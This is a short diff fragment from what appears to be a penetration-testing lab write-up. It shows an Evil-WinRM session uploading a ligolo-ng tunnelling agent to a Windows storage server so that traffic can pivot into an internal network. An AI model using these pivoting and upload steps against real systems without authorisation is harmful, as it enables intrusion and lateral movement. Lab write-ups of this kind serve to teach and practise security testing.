@@ -908,3 +908,19 @@ ligolo-ng »
 
 Ill then set up the interface and set the routing info `240.0.0.1/32` is the address ligolo uses for localhost
 
+```python
+*Evil-WinRM* PS C:\Users\ryan.collins\Documents> upload agent.exe
+                                        
+Info: Uploading /home/kali/hsm/novaforge/agent.exe to C:\Users\ryan.collins\Documents\agent.exe
+                                        
+Data: 9800360 bytes of 9800360 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\ryan.collins\Documents>
+```
+
+Ill then upload the agent via winrm on the storage server
+
+```python
+
+```
